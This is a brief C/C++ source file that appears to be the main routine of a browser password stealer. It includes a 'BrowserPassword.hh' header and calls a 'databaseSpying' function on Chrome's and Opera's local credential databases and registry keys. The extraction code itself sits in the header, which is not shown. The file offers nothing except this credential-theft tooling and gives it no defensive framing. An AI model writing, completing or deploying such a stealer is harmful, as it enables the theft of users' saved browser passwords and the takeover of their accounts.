
#include "BrowserPassword.hh"

int main(int ac, const char **av) 
{
	databaseSpying(C_DBFILE, C_REGKEY, CSIDL_LOCAL_APPDATA); // Chrome 
	databaseSpying(O_DBFILE, O_REGKEY, CSIDL_APPDATA); // Opera 
	return (0);
}
